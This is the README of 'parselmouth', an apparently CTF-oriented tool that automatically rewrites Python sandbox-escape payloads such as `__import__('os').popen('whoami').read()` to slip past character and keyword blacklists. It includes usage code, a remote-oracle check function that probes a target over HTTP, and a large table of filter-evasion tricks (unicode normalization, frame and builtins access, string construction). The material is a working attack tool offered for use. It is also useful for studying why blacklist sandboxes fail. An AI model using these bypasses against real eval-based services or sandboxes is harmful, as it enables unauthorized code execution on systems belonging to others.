# parselmouth
An automated Python sandbox-escape payload bypass framework.

<img alt="image" src="https://github.com/Macr0phag3/parselmouth/blob/master/pic/cases.png">

<img alt="image" src="https://github.com/Macr0phag3/parselmouth/blob/master/pic/main.png">

## 1. Quick Start
- Recommended Python version: `>= 3.10`
- Install dependencies: `pip install -r requirements`

### 1.1 Using the CLI
- Show help: `python parselmouth.py -h`
- Specify both the payload and rules: `python parselmouth.py --payload "__import__('os').popen('whoami').read()" --rule "__" "." "'" '"' "read" "chr"`
  - In many real cases there are too many blocked characters to pass one by one, so `--re-rule` is often more convenient. For example, `--re-rule '[0-9]'` is equivalent to `--rule "0" "1" "2" "3" "4" "5" "6" "7" "8" "9"`.
  - On Windows, if you need to pass `"`, use `"\""` instead of `'"'`.
- You can control bypass methods with `--specify-bypass`. For example, if you do not want integers to use unicode normalization for bypassing, you can pass `--specify-bypass '{"black": {"Bypass_Int": ["by_unicode"]}}'`.
- `--shortest`: search for the shortest expression.
- `--minset`: search for the expression with the smallest character set.
- Use `-v` for more logs, and `-vv` for debug logs. In most cases you do not need debug output.

After adding custom bypass functions, you can put test payloads, rules, and expected answers into `test_case.py`, then run:

```bash
python run_test.py
```

### 1.2 Using It as a Library
```python
import parselmouth as p9h


p9h.BLACK_CHAR = {"kwd": [".", "'", '"']}
# p9h.BLACK_CHAR = {"re_kwd": "\.|'|\""}  # equivalent regex form
runner = p9h.P9H(
    "__import__('os').popen('whoami').read()",
    specify_bypass_map={"black": {"Bypass_Name": ["by_unicode"]}},
    min_len=False, versbose=0,
)
result = runner.visit()
status, c_result = p9h.color_check(result)
if status:
    print("bypass success")
    print("payload:", runner.source_code)
    print("exp:", result)
```

Key `p9h.P9H` arguments:
- `source_code`: the payload to bypass.
- `specify_bypass_map`: white/black list for bypass functions. For example, if you do not want variable names to rely on unicode normalization, pass `{"black": {"Bypass_Name": ["by_unicode"]}}`.
- `min_len`: search for the shortest expression.
- `versbose`: verbosity level (`0` to `3`).
- `depth`: usually not needed; mainly used for indentation when printing logs.
- `bypass_history`: usually not needed; cache for known successful and failed bypass attempts, e.g. `{"success": {}, "failed": []}`.

### 1.3 Customization
**Before customizing anything, it is strongly recommended to read [the design / implementation article](https://www.tr0y.wang/2024/03/04/parselmouth/) and the main code in `parselmouth.py` and `bypass_tools.py`.**

Option 1: follow the article: [Customization Section](https://www.tr0y.wang/2024/03/04/parselmouth/#%E5%AE%9A%E5%88%B6%E5%8C%96%E5%BC%80%E5%8F%91)

Option 2:
- If you need to support a new AST node type, add a new `visit_` method to `P9H` in `parselmouth.py`.
- If payload validity must be checked by interacting with the target, override the `check` behavior. The convention is simple: return `[]` when the payload passes, and return a non-empty list when it fails. Ideally the list should contain the matched blocked strings, but any non-empty list also works if that is all you can get.
- If you want to add a new bypass strategy for an existing AST type, add a new `by_` method to the corresponding bypass class in `bypass_tools.py`. Within the same class, bypass methods are tried in definition order, so earlier methods have higher priority.

#### Custom Bypass Functions
As an example, suppose you want to transform `macr0phag3` into a Base64-decoding expression such as `__import__('base64').b64decode(b'bWFjcjBwaGFnMw==')`. You can dynamically attach a new `by_` method to `Bypass_String`:

```python
import base64

import parselmouth as p9h
import bypass_tools


@bypass_tools.recursion_protect
def by_base64(self):
    encoded = base64.b64encode(self.node._value.encode())
    return self.P9H(
        f'__import__("base64").b64decode({encoded!r})'
    ).visit()


bypass_tools.Bypass_String.by_base64 = by_base64
bypass_tools.Bypass_String.by_base64.__qualname__ = "Bypass_String.by_base64"

p9h.BLACK_CHAR = {"kwd": ["mac", "::", "by_char", "bytes", "chr", "dict"]}
runner = p9h.P9H(
    "'macr0phag3'",
    specify_bypass_map={"white": {"Bypass_String": ["by_base64"]}},
    versbose=2,
)
result = runner.visit()
status, c_result = p9h.color_check(result)
print(status, c_result, result)
```

If you want to replace an existing built-in bypass, assign to the same method name:

```python
bypass_tools.Bypass_String.by_char = by_base64
bypass_tools.Bypass_String.by_char.__qualname__ = "Bypass_String.by_char"
```

After adding custom bypass logic, you can add matching cases to `test_case.py` and run:

```bash
python run_test.py
```

#### Custom Check Functions
By default, `check` only tests whether the generated payload hits the local blacklist:

```python
def check(payload, ignore_space=False):
    if isinstance(payload, ast.AST):
        payload = ast.unparse(payload)

    return [i for i in BLACK_CHAR if i in str(payload)]
```

In real targets, payload validation often has to be done through HTTP requests. In that case, you can directly replace the global `p9h.check` and use the remote target as an oracle:

```python
import time
import requests

import parselmouth as p9h


def check(payload, ignore_space=False):
    result = requests.post(
        "http://127.0.0.1:5000/challenge",
        json={"exp": payload},
        timeout=5,
    ).text
    time.sleep(0.1)  # avoid sending requests too aggressively
    if "hacker" in result:
        return [result]
    return []


p9h.check = check
runner = p9h.P9H("__import__('os').popen('whoami').read()", versbose=2)
result = runner.visit()
status, c_result = p9h.color_check(result)
if status:
    print("bypass success")
    print("payload:", runner.source_code)
    print("exp:", result)
```

This `check` function only needs to follow one convention:
- Return `[]` when the payload passes.
- Return a non-empty list when it fails. Returning the matched blocked strings is best, but any non-empty list is acceptable if that is all you can extract.

Here is a minimal Flask-based test service example:

```python
from flask import Flask, jsonify, request

app = Flask(__name__)


@app.route("/challenge", methods=["POST"])
def check_exp():
    data = request.json
    exp = str(data.get("exp"))

    if exp is None:
        return jsonify({"error": "Missing 'exp' parameter"}), 400

    forbidden_chars = ["'", '"', ".", "popen"]
    for char in forbidden_chars:
        if char in exp:
            return jsonify({"error": "hacker!"}), 400

    return jsonify({"message": "Expression is valid"}), 200


if __name__ == "__main__":
    app.run(debug=True)
```

## 2. Current Bypass Functions

Currently supported:

| Class | Method | Payload | Bypass | Notes |
| ----- | ------ | ------- | ------ | ----- |
| Bypass_Int | by_trans | `0` | `len(())` | |
| Bypass_Int | by_bin | `10` | `0b1010` | convert integers to binary |
| Bypass_Int | by_hex | `10` | `0xa` | convert integers to hex |
| Bypass_Int | by_cal | `10` | `5*2` | rewrite integers as expressions |
| Bypass_Int | by_unicode | `10` | `int('𝟣𝟢')` | int + unicode bypass |
| Bypass_Int | by_ord | `10` | `ord('\n')` | ord-based bypass |

| Class | Method | Payload | Bypass | Notes |
| ----- | ------ | ------- | ------ | ----- |
| Bypass_String | by_empty_str | `""` | `str()` | build an empty string |
| Bypass_String | by_quote_trans | `"macr0phag3"` | `'macr0phag3'` | swap between single and double quotes |
| Bypass_String | by_reverse | `"macr0phag3"` | `"3gahp0rcam"[::-1]` | reverse the string |
| Bypass_String | by_char | `"macr0phag3"` | `(chr(109) + chr(97) + chr(99) + chr(114) + chr(48) + chr(112) + chr(104) + chr(97) + chr(103) + chr(51))` | char-based string construction |
| Bypass_String | by_dict | `"macr0phag3"` | `list(dict(amacr0phag3=()))[0][1:]` | dict-based bypass |
| Bypass_String | by_bytes_single | `"macr0phag3"` | `str(bytes([109]))[2] + str(bytes([97]))[2] + str(bytes([99]))[2] + str(bytes([114]))[2] + str(bytes([48]))[2] + str(bytes([112]))[2] + str(bytes([104]))[2] + str(bytes([97]))[2] + str(bytes([103]))[2] + str(bytes([51]))[2]` | bytes-based bypass |
| Bypass_String | by_bytes_full | `"macr0phag3"` | `bytes([109, 97, 99, 114, 48, 112, 104, 97, 103, 51]).decode()` | full bytes decode bypass |
| Bypass_String | by_format | `"macr0phag3"` | `'{}{}{}{}{}{}{}{}{}{}'.format(chr(109), chr(97), chr(99), chr(114), chr(48), chr(112), chr(104), chr(97), chr(103), chr(51))` | format-based bypass |
| Bypass_String | by_hex_encode | `"macr0phag3"` | `"\x6d\x61\x63\x72\x30\x70\x68\x61\x67\x33"` | hex-encoded string |
| Bypass_String | by_unicode_encode | `"macr0phag3"` | `"\u006d\u0061\u0063\u0072\u0030\u0070\u0068\u0061\u0067\u0033"` | unicode-encoded string |
| Bypass_String | by_char_format | `"macr0phag3"` | `"%c%c%c%c%c%c%c%c%c%c%c%c" % (95,95,98,117,105,108,116,105,110,115,95,95)` | `%c`-format string construction, [@chi111i](https://github.com/chi111i) |
| Bypass_String | by_char_add | `"macr0phag3"` | `'m'+'a'+'c'+'r'+'0'+'p'+'h'+'a'+'g'+'3'` | string addition, [@chi111i](https://github.com/chi111i) |

| Class | Method | Payload | Bypass | Notes |
| ----- | ------ | ------- | ------ | ----- |
| Bypass_Name | by_unicode | `__import__` | `_＿import_＿` | unicode bypass |
| Bypass_Name | by_builtins_attr | `__import__` | `__builtins__.__import__` | fetch the name from module-shaped `__builtins__` |
| Bypass_Name | by_builtins_item | `__import__` | `__builtins__['__import__']` | fetch the name from dict-shaped `__builtins__` |
| Bypass_Name | by_builtin_func_self | `__import__` | `id.__self__.__import__` | reach builtins through any available `builtin_function_or_method.__self__` |
| Bypass_Name | by_frame | `__import__` | `(i for i in ()).gi_frame.f_builtins['__import__']` | fetch the name through generator-frame `f_builtins` |
| Bypass_Name | by_running_frame | `__import__` | `[[*a[0]].pop() for a in [[]] if [a.append((i.gi_frame.f_back for i in a))]][0].f_back.f_builtins['__import__']` | reach caller-frame `f_builtins` through a running generator frame |

| Class | Method | Payload | Bypass | Notes |
| ----- | ------ | ------- | ------ | ----- |
| Bypass_String | by_doc_index | `'system'` | `help.__doc__[...]+...` | build strings by slicing available builtin `__doc__` text |
| Bypass_Attribute | by_getattr | `str.find` | `getattr(str, 'find')` | getattr-based bypass, related idea by [@chi111i](https://github.com/chi111i) |
| Bypass_Attribute | by_vars | `str.find` | `vars(str)["find"]` | vars-based bypass |
| Bypass_Attribute | by_dict_attr | `str.find` | `str.__dict__["find"]` | `__dict__`-based bypass |

| Class | Method | Payload | Bypass | Notes |
| ----- | ------ | ------- | ------ | ----- |
| Bypass_Subscript | by_getitem_attr | `a[0]` / `a[1:2]` | `a.__getitem__(0)` / `a.__getitem__(slice(1,2))` | rewrites unary index/slice access as a direct `__getitem__` call; multi-index cases currently fall back unchanged |
| Bypass_Subscript | by_getitem_getattr | `a[0]` / `a[:2]` | `getattr(a, '__getitem__')(0)` / `getattr(a, '__getitem__')(slice(None,2))` | fetches `__getitem__` via `getattr` before calling it; multi-index cases currently fall back unchanged |

| Class | Method | Payload | Bypass | Notes |
| ----- | ------ | ------- | ------ | ----- |
| Bypass_Call | by_builtin_func_self / by_getattr / by_vars ... | `__import__('os')` / `os.system(1)` | `id.__self__.__import__('os')` / `vars(os)['system'](1)` | dynamically wraps available bypasses for the callee, then lets `try_bypass` choose |

| Class | Method | Payload | Bypass | Notes |
| ----- | ------ | ------- | ------ | ----- |
| Bypass_Keyword | by_unicode | `str(object=1)` | `str(ᵒbject=1)` | unicode bypass |

| Class | Method | Payload | Bypass | Notes |
| ----- | ------ | ------- | ------ | ----- |
| Bypass_BoolOp | by_bitwise | `'yes' if 1 and (2 or 3) or 2 and 3 else 'no'` | `'yes' if 1&(2\|3)\|2&3 else 'no'` | replace `and/or` with `&\|`, [@chi111i](https://github.com/chi111i) |
| Bypass_BoolOp | by_arithmetic | `'yes' if (__import__ and (2 or 3)) or (2 and 3) else 'no'` | `'yes' if bool(bool(__imp𝒐rt__)*bool(bool(2)+bool(3)))+bool(bool(2)*bool(3)) else 'no'` | replace `and/or` with arithmetic / boolean operations, [@chi111i](https://github.com/chi111i) |

And all combinations of the methods above.

If you find a useful bypass trick or run into any problem, feel free to open an issue.

Whether this tool solves a challenge for you or not, issue reports with additional real-world cases are always welcome. I will keep collecting them under `challenges` so everyone can learn from them.

## 3. TODO

- [ ] `exec`, `eval`, and `open` for executing library code
- [ ] `'__buil''tins__'` -> `str.__add__('__buil', 'tins__')`
- [ ] `__import__` -> `__loader__().load_module`
- [ ] `",".join("123")` -> `"".__class__.join(",", "123")`
- [ ] `",".join("123")` -> `str.join(",", "123")`
- [ ] `"0123456789"` -> `sorted(set(str(hash(()))))`
- [ ] `2024` -> `next(reversed(range(2025)))`
- [ ] `{"a": 1}["a"]` -> `{"a": 1}.pop("a")`
- [ ] `1` -> `int(max(max(dict(a၁=()))))`
- [ ] `[i for i in range(10) if i == 5]` -> `[[i][0]for(i)in(range(10))if(i)==5]`
- [ ] `==` -> `in`
- [ ] ~~`True or False` -> `bool(- (True) - (False))`~~ probably not practical
- [ ] `[2, 20, 30]` -> `[i for i in range(31) for j in range(31) if i==0 and j == 2 or i == 1 and j ==20 or i == 2 and j == 30]`

## 4. Others
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" width="400">

[![Stargazers over time](https://starchart.cc/Macr0phag3/parselmouth.svg)](https://starchart.cc/Macr0phag3/parselmouth)
